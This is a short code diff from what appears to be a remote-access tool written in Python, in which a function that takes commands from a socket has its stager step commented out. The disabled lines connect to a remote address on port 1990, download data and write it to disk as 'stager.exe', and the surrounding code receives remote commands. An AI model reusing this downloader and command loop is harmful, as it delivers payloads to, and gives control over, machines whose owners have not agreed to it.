@@ -90,12 +90,12 @@ def start_session(s):
         global active
         if(active != True):
             return
-        stager_socket = socket.socket(socket.AF_INETs,socket.SOCK_STREAM)
-        stager_socket.connect((ip,1990))
-        data = stager_socket.recv(40960)
-        file = open("stager.exe",'wb')
-        file.write(data)
-        file.close()
+        # stager_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        # stager_socket.connect((ip,1990))
+        # data = stager_socket.recv(40960)
+        # file = open("stager.exe",'wb')
+        # file.write(data)
+        # file.close()
         try:
             cmd = s.recv(1024).decode()
 
